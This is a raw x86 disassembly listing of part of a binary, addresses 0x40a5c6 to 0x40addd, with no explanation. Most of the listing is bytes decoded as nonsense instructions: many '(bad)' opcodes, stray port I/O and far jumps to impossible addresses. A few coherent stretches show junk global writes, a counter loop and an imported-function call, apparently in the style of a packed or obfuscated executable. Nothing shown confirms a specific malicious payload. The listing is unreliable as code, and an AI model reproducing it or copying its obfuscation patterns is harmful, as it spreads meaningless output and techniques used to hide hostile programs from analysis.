  40a5c6:	jo     0x40a63a
  40a5c8:	mov    eax,ds:0xf23c32e6
  40a5cd:	mov    ebp,DWORD PTR [eax-0x35eda5b]
  40a5d3:	push   ss
  40a5d4:	dec    ebx
  40a5d5:	jg     0x40a5da
  40a5d7:	jl     0x40a58b
  40a5d9:	jg     0x40a594
  40a5db:	aas    
  40a5dc:	cmp    ecx,0xe99995fd
  40a5e2:	sbb    bh,BYTE PTR [edx+0x6a]
  40a5e5:	jmp    0x40a5bf
  40a5e7:	mov    bh,0x87
  40a5e9:	in     al,dx
  40a5ea:	sbb    eax,0xef0f6081
  40a5ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5f0:	or     BYTE PTR [edi+0x18],dl
  40a5f3:	dec    eax
  40a5f4:	dec    esp
  40a5f5:	in     eax,dx
  40a5f6:	add    al,0xf1
  40a5f8:	xor    BYTE PTR [edi+0xba9626d],0x17
  40a5ff:	je     0x40a65a
  40a601:	loope  0x40a608
  40a603:	(bad)  
  40a604:	loopne 0x40a640
  40a606:	sar    DWORD PTR [edx-0x640d1ad1],cl
  40a60c:	jle    0x40a67d
  40a60e:	adc    ch,al
  40a610:	cmp    bh,cl
  40a612:	jne    0x40a640
  40a614:	loopne 0x40a5df
  40a616:	idiv   eax
  40a618:	jbe    0x40a61a
  40a61a:	loope  0x40a60c
  40a61c:	add    bh,dh
  40a61e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a61f:	pop    ds
  40a620:	scas   eax,DWORD PTR es:[edi]
  40a621:	or     al,0x6b
  40a623:	push   ss
  40a624:	sub    dh,0x2
  40a627:	mov    esp,0x3cdc2017
  40a62c:	mov    BYTE PTR [ecx+ebp*8+0x7a],bh
  40a630:	rol    DWORD PTR gs:[ebx+0x216777b8],0x74
  40a638:	cmp    dh,BYTE PTR [eax-0x66]
  40a63b:	(bad)  
  40a63c:	(bad)  
  40a63d:	scas   eax,DWORD PTR es:[edi]
  40a63e:	push   0xffffffd9
  40a640:	mov    ch,0xed
  40a642:	pop    es
  40a643:	push   edx
  40a644:	cmc    
  40a645:	bound  ebx,QWORD PTR [ebx]
  40a647:	cmp    dl,BYTE PTR [edx+0x46]
  40a64a:	in     eax,dx
  40a64b:	add    ah,ch
  40a64d:	mov    eax,0x8e2a3b03
  40a652:	ja     0x40a5f5
  40a654:	mov    dh,0x4
  40a656:	jns    0x40a5f7
  40a658:	ja     0x40a657
  40a65a:	mov    BYTE PTR [esi+ecx*8-0x27],bh
  40a65e:	push   cs
  40a65f:	jo     0x40a6d8
  40a661:	xchg   DWORD PTR [esi],esp
  40a663:	loopne 0x40a5eb
  40a665:	jae    0x40a63d
  40a667:	xor    dl,al
  40a669:	push   ebp
  40a66a:	(bad)  
  40a66b:	loop   0x40a5fc
  40a66d:	add    al,0x77
  40a66f:	pop    es
  40a670:	int    0x1a
  40a672:	call   ecx
  40a674:	jecxz  0x40a6e4
  40a676:	fucomp st(7)
  40a678:	in     eax,dx
  40a679:	mov    edi,0x269f61b6
  40a67e:	cmp    ebp,0x7f32a559
  40a684:	and    dl,BYTE PTR [ecx-0x53]
  40a687:	mov    esi,0xaec80092
  40a68c:	push   edi
  40a68d:	xor    al,0x43
  40a68f:	int    0x5d
  40a691:	lock imul esp,DWORD PTR [esi+0x37b2757d],0xffffffff
  40a699:	dec    ebx
  40a69a:	xlat   BYTE PTR ds:[ebx]
  40a69b:	sti    
  40a69c:	aad    0x94
  40a69e:	xor    BYTE PTR ds:0xad1ce687,dh
  40a6a4:	ret    0x933b
  40a6a7:	int3   
  40a6a8:	mov    es,WORD PTR [ebx]
  40a6aa:	jmp    0x93b:0x9927b491
  40a6b1:	aam    0x2e
  40a6b3:	cmp    edx,DWORD PTR [esi+0x57]
  40a6b6:	mov    eax,0x20001bcd
  40a6bb:	sub    eax,0x57e9d522
  40a6c0:	mov    ecx,DWORD PTR [edx-0x47]
  40a6c3:	xor    ebx,DWORD PTR [ecx-0x4f]
  40a6c6:	add    dh,BYTE PTR [edx]
  40a6c8:	jb     0x40a745
  40a6ca:	aas    
  40a6cb:	cli    
  40a6cc:	call   0x825a:0x7ddcde86
  40a6d3:	push   ecx
  40a6d4:	sub    bh,bh
  40a6d6:	fisttp WORD PTR fs:[edx+edi*1-0x3018feb7]
  40a6de:	and    al,0x4a
  40a6e0:	sub    al,0x7e
  40a6e2:	jmp    0xa210b35f
  40a6e7:	xchg   esi,eax
  40a6e8:	dec    edx
  40a6e9:	mov    edi,DWORD PTR [esi-0x7c4f786]
  40a6ef:	mov    DWORD PTR ds:0x4337eb,0x5aa8
  40a6f9:	jne    0x40b4e6
  40a6ff:	adc    DWORD PTR ds:0x4337d7,0xbfa
  40a709:	push   DWORD PTR [ebp+0x8]
  40a70c:	add    DWORD PTR ds:0x433867,0x7522
  40a716:	call   0x4115fc
  40a71b:	sbb    ecx,0x1aca
  40a721:	mov    DWORD PTR [ebp-0x20],eax
  40a724:	mov    eax,DWORD PTR [ebp-0x4]
  40a727:	xor    esi,esi
  40a729:	xor    esi,DWORD PTR ds:0x433897
  40a72f:	or     DWORD PTR ds:0x4338a3,esi
  40a735:	mov    ecx,DWORD PTR [ebp-0x20]
  40a738:	mov    esi,0x7510854
  40a73d:	xor    eax,esi
  40a73f:	add    DWORD PTR ds:0x433893,0x433787
  40a749:	add    eax,ebx
  40a74b:	mov    DWORD PTR ds:0x43382f,0x4f05
  40a755:	cmp    ecx,eax
  40a757:	mov    DWORD PTR ds:0x4337e7,0x525
  40a761:	je     0x40b9ed
  40a767:	add    DWORD PTR ds:0x43386f,0x3590
  40a771:	push   DWORD PTR [ebp-0x20]
  40a774:	xor    DWORD PTR ds:0x43377f,0x1906
  40a77e:	push   DWORD PTR [ebp+0x8]
  40a781:	dec    DWORD PTR ds:0x43385b
  40a787:	call   0x40eac8
  40a78c:	movzx  ecx,WORD PTR ds:0x43378b
  40a793:	sub    DWORD PTR ds:0x4337a3,ecx
  40a799:	jmp    0x40a9fc
  40a79e:	or     al,0xd4
  40a7a0:	and    ah,bl
  40a7a2:	loopne 0x40a78c
  40a7a4:	shl    ah,1
  40a7a6:	sti    
  40a7a7:	and    eax,0x3df2ec0c
  40a7ac:	ret    0x164a
  40a7af:	in     eax,dx
  40a7b0:	jle    0x40a830
  40a7b2:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a7b6:	out    0x83,eax
  40a7b8:	out    dx,eax
  40a7b9:	push   eax
  40a7ba:	adc    eax,0x6c3db20
  40a7bf:	fs push edi
  40a7c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7c2:	loopne 0x40a7e9
  40a7c4:	push   es
  40a7c5:	loope  0x40a7bf
  40a7c7:	xchg   esi,eax
  40a7c8:	mov    esp,DWORD PTR [ebx]
  40a7ca:	mov    edx,0xee814698
  40a7cf:	mov    dh,0xb8
  40a7d1:	or     bh,BYTE PTR [eax]
  40a7d3:	pushf  
  40a7d4:	adc    cl,ah
  40a7d6:	test   DWORD PTR [esi],esp
  40a7d8:	inc    ebx
  40a7d9:	mov    esp,0x6d745d02
  40a7de:	xchg   ecx,eax
  40a7df:	popa   
  40a7e0:	and    DWORD PTR [ebx+0x56d15cea],eax
  40a7e6:	dec    ecx
  40a7e7:	add    eax,0xb681b445
  40a7ec:	sub    cl,BYTE PTR ds:0xa2133767
  40a7f2:	cmp    DWORD PTR [edx+ebx*1-0x5218ec75],eax
  40a7f9:	and    dh,dl
  40a7fb:	loope  0x40a843
  40a7fd:	xchg   esi,eax
  40a7fe:	mov    ds:0xdf2a19a5,eax
  40a804:	popf   
  40a805:	(bad)  
  40a806:	jae    0x40a878
  40a808:	fidivr DWORD PTR [ecx]
  40a80a:	add    BYTE PTR [ecx-0x5ff27e3e],cl
  40a810:	sbb    DWORD PTR [edx+0x3807e7f8],eax
  40a816:	add    eax,0xdf1c4a98
  40a81b:	adc    DWORD PTR [esi-0x6],ecx
  40a81e:	pop    esp
  40a81f:	cmp    bl,ch
  40a821:	fisub  DWORD PTR [edi+0x3c]
  40a824:	push   esp
  40a825:	pop    es
  40a826:	lods   al,BYTE PTR ds:[esi]
  40a827:	pop    ebp
  40a828:	pushf  
  40a829:	mov    ecx,0x44635220
  40a82e:	ret    
  40a82f:	call   0xa5d770f
  40a834:	ror    eax,0x4
  40a837:	jbe    0x40a8b1
  40a839:	sbb    eax,0x8bf39459
  40a83e:	clc    
  40a83f:	jae    0x40a7f7
  40a841:	or     ebx,DWORD PTR [ebp+0x96be03b]
  40a847:	cmc    
  40a848:	sbb    al,0x7a
  40a84a:	cmp    BYTE PTR [ebx-0x2f],ch
  40a84d:	push   ebx
  40a84e:	dec    ebp
  40a84f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a850:	jp     0x40a8d0
  40a852:	mov    ch,0xc8
  40a854:	mov    bh,0x2d
  40a856:	inc    ebx
  40a857:	test   al,0x84
  40a859:	in     al,dx
  40a85a:	pop    ebp
  40a85b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a85c:	push   0xffffff83
  40a85e:	mov    ah,BYTE PTR ds:0xba54ffa5
  40a864:	hlt    
  40a865:	in     al,0xa0
  40a867:	pop    esi
  40a868:	adc    eax,0x991c4e96
  40a86d:	scas   eax,DWORD PTR es:[edi]
  40a86e:	adc    BYTE PTR [esi-0x62],ch
  40a871:	es sub al,bh
  40a874:	and    edx,DWORD PTR [esi+0x57]
  40a877:	jl     0x40a8c6
  40a879:	mov    ch,0x9d
  40a87b:	xchg   esi,eax
  40a87c:	xor    DWORD PTR [eax],0x507fc3f1
  40a882:	(bad)  
  40a884:	mov    bl,al
  40a886:	jle    0x40a873
  40a888:	pusha  
  40a889:	jp     0x40a8d9
  40a88b:	or     DWORD PTR [edx+0x615c1c90],eax
  40a891:	stc    
  40a892:	add    eax,DWORD PTR [esi]
  40a894:	cwde   
  40a895:	inc    edi
  40a896:	mov    ah,0xdd
  40a898:	jmp    FWORD PTR [eax+esi*2-0x517b870f]
  40a89f:	mov    ds:0x92433db2,al
  40a8a4:	dec    eax
  40a8a5:	loopne 0x40a860
  40a8a7:	adc    ecx,DWORD PTR [edi]
  40a8a9:	or     bl,bl
  40a8ab:	ds mov esp,0xd493498e
  40a8b1:	aad    0xc6
  40a8b3:	div    DWORD PTR [esi-0xe6c5fa7]
  40a8b9:	iret   
  40a8ba:	js     0x40a936
  40a8bc:	cdq    
  40a8bd:	or     BYTE PTR [ecx],ch
  40a8bf:	fwait
  40a8c0:	or     dh,BYTE PTR [edx+0x15]
  40a8c3:	loopne 0x40a862
  40a8c5:	jb     0x40a893
  40a8c7:	pop    ss
  40a8c8:	das    
  40a8c9:	gs cmp edi,ecx
  40a8cc:	rcr    DWORD PTR [eax-0x215e1c75],1
  40a8d2:	lds    ecx,FWORD PTR [esi+eiz*1+0x8]
  40a8d6:	inc    esi
  40a8d7:	mov    edi,0xfea0fc81
  40a8dc:	int3   
  40a8dd:	and    eax,0x3f3fa973
  40a8e2:	sbb    al,0x9e
  40a8e4:	and    BYTE PTR [eax+ebp*2],0x7
  40a8e8:	pop    esi
  40a8e9:	loop   0x40a906
  40a8eb:	pop    ss
  40a8ec:	mov    bh,0xeb
  40a8ee:	xchg   BYTE PTR [edx+ecx*1+0x40],cl
  40a8f2:	daa    
  40a8f3:	popf   
  40a8f4:	mov    edx,0xa62d368a
  40a8f9:	(bad)  
  40a8fa:	mov    al,ds:0x27f2986d
  40a8ff:	test   eax,0xfb77a160
  40a904:	push   edi
  40a905:	pop    esi
  40a906:	mov    al,0xdc
  40a908:	call   DWORD PTR [ebx+0x50f53141]
  40a90e:	sub    al,0x5d
  40a910:	pushf  
  40a911:	mov    ebx,0x7a7dfba5
  40a916:	(bad)  
  40a917:	cmp    dl,bh
  40a919:	push   cs
  40a91a:	test   al,0xb0
  40a91c:	cmp    ebp,esp
  40a91e:	mov    ds:0x46cddd0a,al
  40a923:	lea    edx,[ecx-0x1d8652c4]
  40a929:	fwait
  40a92a:	sub    BYTE PTR [edi+0x43c511e3],bh
  40a930:	sar    BYTE PTR [edi],cl
  40a932:	mov    ah,0xb6
  40a934:	push   ecx
  40a935:	xchg   edi,eax
  40a936:	xor    dh,BYTE PTR [ecx+0x3d080898]
  40a93c:	mov    ebp,0x40a28336
  40a941:	ret    0x89a
  40a944:	lahf   
  40a945:	mov    edx,0x4fea9369
  40a94a:	mov    WORD PTR [edi-0x43],fs
  40a94d:	ins    DWORD PTR es:[edi],dx
  40a94e:	outs   dx,BYTE PTR ds:[esi]
  40a94f:	test   al,0xff
  40a951:	fucomp st(1)
  40a953:	mov    bh,0xbd
  40a955:	(bad)  
  40a956:	mov    cl,0x2b
  40a958:	push   edi
  40a959:	not    edi
  40a95b:	or     esi,DWORD PTR [edi+0x79]
  40a95e:	rol    edx,1
  40a960:	and    ch,BYTE PTR [esi+0x5]
  40a963:	jge    0x40a919
  40a965:	sbb    al,0xb5
  40a967:	jnp    0x40a99c
  40a969:	add    eax,0x1068bf45
  40a96e:	and    eax,0xd07abe4c
  40a973:	pop    ecx
  40a974:	and    ebp,DWORD PTR [eax-0x75]
  40a977:	jecxz  0x40a9b8
  40a979:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a97a:	ss mov esp,0xf1907be3
  40a980:	repnz jecxz 0x40a9b4
  40a983:	xchg   esp,eax
  40a984:	jmp    0x6104e043
  40a989:	mov    ch,0x3d
  40a98b:	push   cs
  40a98c:	adc    eax,0x5857e46f
  40a991:	shr    DWORD PTR [ebp-0x76],1
  40a994:	mov    bh,BYTE PTR [ebx]
  40a996:	fistp  QWORD PTR ds:0x8785
  40a99b:	jmp    0x74678542
  40a9a0:	dec    esi
  40a9a1:	cmp    eax,0x6a6bd71a
  40a9a6:	call   0x664531bb
  40a9ab:	mov    ebx,0xa9c1a7f4
  40a9b0:	std    
  40a9b1:	enter  0xf4e,0x8d
  40a9b5:	push   es
  40a9b6:	out    dx,eax
  40a9b7:	sbb    BYTE PTR [edi+ebx*1-0x3bedac44],ah
  40a9be:	popa   
  40a9bf:	sbb    DWORD PTR [esp+esi*2],ebp
  40a9c2:	int3   
  40a9c3:	or     ch,BYTE PTR [esi+eax*4]
  40a9c6:	push   es
  40a9c7:	push   ds
  40a9c8:	push   ebp
  40a9c9:	inc    ebx
  40a9ca:	xor    DWORD PTR [eax],ebp
  40a9cc:	aad    0xe4
  40a9ce:	fs pop edi
  40a9d0:	inc    esp
  40a9d1:	push   es
  40a9d2:	cmp    DWORD PTR [edi-0x14d4a2fb],0x57
  40a9d9:	das    
  40a9da:	jae    0x40a9b3
  40a9dc:	and    al,0x9e
  40a9de:	adc    BYTE PTR [esi],cl
  40a9e0:	pop    ds
  40a9e1:	pop    ss
  40a9e2:	jle    0x40a980
  40a9e4:	sbb    BYTE PTR [ecx+ebp*8-0x69],cl
  40a9e8:	jmp    0x40aa20
  40a9ea:	out    0x7b,eax
  40a9ec:	shl    DWORD PTR [ebx+0x9b2f5e8],0xa9
  40a9f3:	sti    
  40a9f4:	push   ebp
  40a9f5:	bound  ecx,QWORD PTR [esi+ebx*1]
  40a9f8:	imul   esi,esi,0x45895971
  40a9fe:	in     al,dx
  40a9ff:	mov    eax,DWORD PTR [ebp-0x4]
  40aa02:	xor    DWORD PTR ds:0x433797,edi
  40aa08:	mov    ecx,DWORD PTR [ebp-0x14]
  40aa0b:	xor    eax,esi
  40aa0d:	adc    DWORD PTR ds:0x433897,0x433867
  40aa17:	add    eax,ebx
  40aa19:	mov    DWORD PTR ds:0x4337e7,0x6600
  40aa23:	jmp    0x40ac86
  40aa28:	dec    ebp
  40aa29:	ret    
  40aa2a:	xchg   esp,eax
  40aa2b:	push   eax
  40aa2c:	nop
  40aa2d:	push   ecx
  40aa2e:	dec    ecx
  40aa2f:	ret    
  40aa30:	mov    esp,DWORD PTR es:[edx+eiz*2]
  40aa34:	mov    eax,ds:0xd0e48557
  40aa39:	jmp    0x40aab9
  40aa3b:	jle    0x40aa75
  40aa3d:	jl     0x40aabd
  40aa3f:	jle    0x40aa30
  40aa41:	iret   
  40aa42:	and    DWORD PTR [ecx+0x1563797b],edx
  40aa48:	push   ebp
  40aa49:	cmc    
  40aa4a:	cli    
  40aa4b:	cs out dx,eax
  40aa4d:	ins    DWORD PTR es:[edi],dx
  40aa4e:	inc    ebx
  40aa4f:	jnp    0x40aa74
  40aa51:	xor    ch,BYTE PTR [esi-0x10cbd30e]
  40aa57:	loopne 0x40aa44
  40aa59:	rcl    DWORD PTR [eax+ecx*4-0x36],1
  40aa5d:	loopne 0x40aa61
  40aa5f:	mov    ds:0xc7ad7f3,eax
  40aa64:	repz and DWORD PTR [esp+eiz*4-0x47],ecx
  40aa69:	fmul   st,st(4)
  40aa6b:	mov    gs,edx
  40aa6d:	adc    ecx,0xffffffc9
  40aa70:	jne    0x40aa84
  40aa72:	retf   0xa488
  40aa75:	inc    ebx
  40aa76:	pop    ebx
  40aa77:	sub    DWORD PTR [esi+0x89404d],edx
  40aa7d:	fld    TBYTE PTR [ecx-0x45]
  40aa80:	(bad)  
  40aa81:	int    0x71
  40aa83:	icebp  
  40aa84:	xor    al,0x95
  40aa86:	ret    0x7df5
  40aa89:	sbb    ebp,esp
  40aa8b:	enter  0x69e8,0x9
  40aa8f:	into   
  40aa90:	sub    bl,al
  40aa92:	sbb    DWORD PTR [ecx],esi
  40aa94:	add    eax,0xace483a3
  40aa99:	jbe    0x40ab0c
  40aa9b:	and    eax,0xa84d8bc8
  40aaa0:	pop    es
  40aaa1:	ret    0x7c20
  40aaa4:	sbb    ch,BYTE PTR [eax+0x5]
  40aaa7:	xchg   edi,eax
  40aaa8:	mov    ebp,esi
  40aaaa:	jmp    0xbf11:0x8ed7525
  40aab1:	test   BYTE PTR ds:[ebx],bh
  40aab4:	lds    ebp,FWORD PTR [edi+0x271143f6]
  40aaba:	call   0xfd88:0xc7a0d00e
  40aac1:	sar    BYTE PTR [di-0x5b],0x62
  40aac6:	push   eax
  40aac7:	shr    DWORD PTR [esi-0x1d],0x9c
  40aacb:	dec    edi
  40aacc:	loopne 0x40ab28
  40aace:	add    DWORD PTR [eax+0x3f],eax
  40aad1:	push   es
  40aad2:	dec    esi
  40aad3:	xor    al,0x53
  40aad5:	push   edi
  40aad6:	dec    edx
  40aad7:	jmp    0x7f09:0xbf3f9e61
  40aade:	dec    ebx
  40aadf:	sbb    eax,0x4628c2d9
  40aae4:	nop
  40aae5:	jae    0x40ab62
  40aae7:	repz pop edx
  40aae9:	nop
  40aaea:	sahf   
  40aaeb:	fs xchg ebp,eax
  40aaed:	pop    edi
  40aaee:	xlat   BYTE PTR ds:[ebx]
  40aaef:	ret    0xe35c
  40aaf2:	loope  0x40aad6
  40aaf4:	push   ds
  40aaf5:	jl     0x40ab58
  40aaf7:	das    
  40aaf8:	adc    DWORD PTR [esp+eiz*8],ebp
  40aafb:	mov    ch,0xf7
  40aafd:	loope  0x40ab73
  40aaff:	mov    ds:0xc7c2d56c,al
  40ab04:	shl    ecx,cl
  40ab06:	sbb    DWORD PTR [ebx],0x77
  40ab09:	push   ebx
  40ab0a:	jg     0x40ab82
  40ab0c:	sbb    eax,0xf2cbbc2e
  40ab11:	push   edi
  40ab12:	in     eax,dx
  40ab13:	or     eax,0x85375129
  40ab18:	mov    eax,0x68de9046
  40ab1d:	inc    ebx
  40ab1e:	push   0x730c4860
  40ab23:	mov    esi,0x1095614e
  40ab28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab29:	and    BYTE PTR [eax],dh
  40ab2b:	bound  esi,QWORD PTR [edx]
  40ab2d:	into   
  40ab2e:	cmp    eax,0x419e7df0
  40ab33:	sbb    BYTE PTR [ebx],0xd6
  40ab36:	aas    
  40ab37:	cli    
  40ab38:	scas   al,BYTE PTR es:[edi]
  40ab39:	inc    ecx
  40ab3a:	ret    0x44a4
  40ab3d:	xchg   esp,eax
  40ab3e:	iret   
  40ab3f:	mov    ecx,0x18b46e97
  40ab44:	jb     0x40ab18
  40ab46:	inc    ebx
  40ab47:	dec    eax
  40ab48:	lea    ecx,[esi]
  40ab4a:	fcomp  st(1)
  40ab4c:	out    dx,al
  40ab4d:	jge    0x40ab03
  40ab4f:	cmp    BYTE PTR [edx],0xb8
  40ab52:	mov    ebp,0x8bd912ca
  40ab57:	lods   eax,DWORD PTR ds:[esi]
  40ab58:	add    esp,edi
  40ab5a:	loopne 0x40aade
  40ab5c:	push   ds
  40ab5d:	inc    esp
  40ab5e:	mov    dl,0x54
  40ab60:	xchg   esi,eax
  40ab61:	test   DWORD PTR [ecx],ebp
  40ab63:	js     0x40ab56
  40ab65:	xchg   esi,eax
  40ab66:	(bad)  
  40ab67:	xchg   ecx,eax
  40ab68:	pop    eax
  40ab69:	sti    
  40ab6a:	ins    DWORD PTR es:[edi],dx
  40ab6b:	scas   eax,DWORD PTR es:[edi]
  40ab6c:	outs   dx,DWORD PTR ds:[esi]
  40ab6d:	adc    al,0xde
  40ab6f:	sti    
  40ab70:	mov    ch,0x2
  40ab72:	sub    al,0x7e
  40ab74:	cdq    
  40ab75:	mov    dl,0x59
  40ab77:	(bad)  
  40ab78:	(bad)  
  40ab79:	adc    eax,DWORD PTR ds:0xb807333a
  40ab7f:	or     dh,dh
  40ab81:	sbb    dh,BYTE PTR [ecx-0x71]
  40ab84:	xchg   esp,eax
  40ab85:	fwait
  40ab86:	mov    ah,BYTE PTR [edx+edi*1-0x25]
  40ab8a:	push   edx
  40ab8b:	bound  esi,QWORD PTR [edx]
  40ab8d:	fnstenv [eax-0x6a]
  40ab90:	mov    cl,0xfa
  40ab92:	data16 fmul QWORD PTR [ebx]
  40ab95:	std    
  40ab96:	aam    0xa9
  40ab98:	mov    ebx,0x968efe36
  40ab9d:	dec    esi
  40ab9e:	rcl    DWORD PTR [edi+0x429c6c1c],0x8e
  40aba5:	xor    edx,DWORD PTR [eax-0xf]
  40aba8:	jmp    0x40abaa
  40abaa:	sbb    al,0xf3
  40abac:	ror    DWORD PTR [esi+0x675de115],1
  40abb2:	dec    edx
  40abb3:	shl    BYTE PTR [ebx],cl
  40abb5:	sahf   
  40abb6:	sbb    eax,0x35239bd0
  40abbb:	ret    0xaf0b
  40abbe:	pop    esp
  40abbf:	mov    edi,0xabee1122
  40abc4:	mov    ds:0xe1173e08,eax
  40abc9:	or     BYTE PTR [ebx+0x22],0xaa
  40abcd:	out    dx,al
  40abce:	or     al,0x99
  40abd0:	pop    ds
  40abd1:	and    DWORD PTR [esi+0x48],edx
  40abd4:	ja     0x40ac26
  40abd6:	out    0xe8,al
  40abd8:	js     0x40abb4
  40abda:	xchg   ebx,eax
  40abdb:	mov    BYTE PTR [edx-0x13],dl
  40abde:	(bad)  
  40abdf:	aad    0xf4
  40abe1:	pop    edx
  40abe2:	out    dx,eax
  40abe3:	hlt    
  40abe4:	cli    
  40abe5:	jne    0x40abd4
  40abe7:	loope  0x40abbe
  40abe9:	cmp    BYTE PTR [ebp-0x2a],0x76
  40abed:	mov    dl,0x43
  40abef:	neg    eax
  40abf1:	sbb    ah,dh
  40abf3:	push   ebp
  40abf4:	push   edi
  40abf5:	(bad)  
  40abf6:	xchg   ecx,eax
  40abf7:	retf   
  40abf8:	mov    eax,0xca595ac8
  40abfd:	out    0x81,al
  40abff:	pop    ss
  40ac00:	inc    ebx
  40ac01:	inc    esp
  40ac02:	(bad)  
  40ac03:	cmp    al,0x3
  40ac05:	test   bh,al
  40ac07:	xor    al,BYTE PTR [edi]
  40ac09:	jo     0x40ac08
  40ac0b:	cmp    edx,ecx
  40ac0d:	repz mov ch,0xb
  40ac10:	mov    esp,esp
  40ac12:	clc    
  40ac13:	stc    
  40ac14:	cmp    BYTE PTR [ecx+0x6be04a3b],ah
  40ac1a:	js     0x40ac7a
  40ac1c:	dec    ebx
  40ac1d:	addr16 and esi,esp
  40ac20:	push   0xffc3b131
  40ac25:	test   eax,0x8ed8217f
  40ac2a:	push   ds
  40ac2b:	cmc    
  40ac2c:	sahf   
  40ac2d:	and    ch,BYTE PTR [eax+0x6731b3bf]
  40ac33:	xchg   BYTE PTR [edx-0x3a],ch
  40ac36:	test   BYTE PTR [esp+edi*2+0x7468e5e4],0x3f
  40ac3e:	(bad)  
  40ac3f:	xchg   esp,eax
  40ac40:	xchg   esi,eax
  40ac41:	loop   0x40ac03
  40ac43:	cmp    eax,ecx
  40ac45:	push   0x3dc7f23b
  40ac4a:	pop    ebx
  40ac4b:	rcr    BYTE PTR [edx+0xcddf564],0x1d
  40ac52:	test   al,0xac
  40ac54:	aaa    
  40ac55:	fidiv  DWORD PTR [ebx+0x5a]
  40ac58:	add    eax,0x7e19ba8b
  40ac5d:	pop    esp
  40ac5e:	sbb    eax,0xbc800263
  40ac63:	mov    eax,ds:0xd822f242
  40ac68:	jmp    0x4fbc877f
  40ac6d:	push   0x46
  40ac6f:	jecxz  0x40ace9
  40ac71:	sbb    BYTE PTR gs:[esi+0x514be6a],dl
  40ac78:	and    eax,0xabcc0b40
  40ac7d:	jb     0x40ac38
  40ac7f:	mov    bh,0xfa
  40ac81:	aaa    
  40ac82:	setnp  BYTE PTR [esi]
  40ac85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac86:	cmp    ecx,eax
  40ac88:	je     0x40b9ed
  40ac8e:	sbb    DWORD PTR ds:0x4337eb,0x7413
  40ac98:	mov    eax,DWORD PTR [ebp-0x14]
  40ac9b:	and    DWORD PTR ds:0x43386f,0x0
  40aca5:	xor    ecx,ecx
  40aca7:	or     ecx,DWORD PTR ds:0x43386f
  40acad:	inc    ecx
  40acae:	mov    DWORD PTR ds:0x43386f,ecx
  40acb4:	cmp    DWORD PTR ds:0x43386f,0x6
  40acbb:	jne    0x40acdb
  40acc1:	push   0x433908
  40acc6:	push   0x43394c
  40accb:	push   0x3fa4
  40acd0:	push   0x125d
  40acd5:	call   DWORD PTR ds:0x4120e4
  40acdb:	cmp    DWORD PTR ds:0x43386f,0x5
  40ace2:	jne    0x40acf7
  40ace8:	xor    ecx,ecx
  40acea:	or     ecx,DWORD PTR ds:0x43386f
  40acf0:	inc    ecx
  40acf1:	mov    DWORD PTR ds:0x43386f,ecx
  40acf7:	cmp    DWORD PTR ds:0x43386f,0x1a
  40acfe:	jb     0x40aca5
  40ad04:	adc    DWORD PTR ds:0x43381f,0xf8d
  40ad0e:	jmp    0x40af71
  40ad13:	stos   DWORD PTR es:[edi],eax
  40ad14:	adc    eax,0x70b1f693
  40ad19:	imul   edx,DWORD PTR [ecx+0x53],0x49
  40ad1d:	adc    BYTE PTR [esi-0x20e0b248],bh
  40ad23:	call   0x7e7c:0x387e7ee9
  40ad2a:	jle    0x40acbf
  40ad2c:	pop    esi
  40ad2d:	adc    eax,0x1309fee5
  40ad32:	xor    bh,BYTE PTR [edx+eiz*2+0x76321c4c]
  40ad39:	jmp    0x40acd8
  40ad3b:	cmp    DWORD PTR [ebp+0x5f],ebp
  40ad3e:	jg     0x40ad3d
  40ad40:	adc    DWORD PTR ds:0x2e00f3e9,edi
  40ad46:	jmp    0x1819f841
  40ad4b:	out    0x86,eax
  40ad4d:	pop    ecx
  40ad4e:	push   ebx
  40ad4f:	add    bl,BYTE PTR [ebp-0xd]
  40ad52:	jb     0x40ad6c
  40ad54:	mov    ah,0x64
  40ad56:	lods   eax,DWORD PTR ds:[esi]
  40ad57:	cdq    
  40ad58:	mov    ecx,ebp
  40ad5a:	jg     0x40ad71
  40ad5c:	adc    cl,BYTE PTR [ecx-0x41c44fcf]
  40ad62:	sbb    BYTE PTR [ebx+0x57],0x6d
  40ad66:	push   ebx
  40ad67:	pop    ss
  40ad68:	(bad)  [edx]
  40ad6a:	arpl   WORD PTR [edi],si
  40ad6c:	cmp    esi,DWORD PTR [esi-0x276b9d9]
  40ad72:	aaa    
  40ad73:	stos   DWORD PTR es:[edi],eax
  40ad74:	addr16 in al,dx
  40ad76:	jbe    0x40ad85
  40ad78:	(bad)
  40ad7d:	ins    BYTE PTR es:[edi],dx
  40ad7e:	rol    bh,0x24
  40ad81:	inc    esp
  40ad82:	jnp    0x40ad87
  40ad84:	je     0x40adf7
  40ad86:	xor    al,0x69
  40ad88:	std    
  40ad89:	xor    DWORD PTR [ecx],edi
  40ad8b:	ja     0x40ae0b
  40ad8d:	mov    DWORD PTR [ebx+0x79112f8],eax
  40ad93:	dec    esi
  40ad94:	(bad)  
  40ad95:	neg    DWORD PTR [ebx+0x8]
  40ad98:	fwait
  40ad99:	test   eax,0x88b2f194
  40ad9e:	retf   
  40ad9f:	xchg   esi,eax
  40ada0:	sbb    bh,BYTE PTR [eax-0x1b]
  40ada3:	mov    al,ds:0x627b7efe
  40ada8:	scas   al,BYTE PTR es:[edi]
  40ada9:	cli    
  40adaa:	inc    esi
  40adab:	loop   0x40ad87
  40adad:	lock xchg ebp,eax
  40adaf:	mov    ebx,DWORD PTR [eax]
  40adb1:	mov    WORD PTR [ebp+0x5f9fd21a],ss
  40adb7:	(bad)  
  40adb8:	and    al,0xb7
  40adba:	mov    cl,0x28
  40adbc:	cli    
  40adbd:	push   eax
  40adbe:	rol    bh,cl
  40adc0:	out    dx,al
  40adc1:	jecxz  0x40ad4d
  40adc3:	out    dx,eax
  40adc4:	push   ecx
  40adc5:	call   0x42e0:0x826171cc
  40adcc:	aam    0xd6
  40adce:	xchg   esi,ebx
  40add0:	push   esp
  40add1:	out    dx,al
  40add2:	scas   al,BYTE PTR es:[edi]
  40add3:	xchg   edi,eax
  40add4:	sub    DWORD PTR [ebp-0x49],edx
  40add7:	pop    edi
  40add8:	mov    ah,0xaa
  40adda:	jp     0x40ad70
  40addc:	pop    eax
  40addd:	in     eax,0x9b
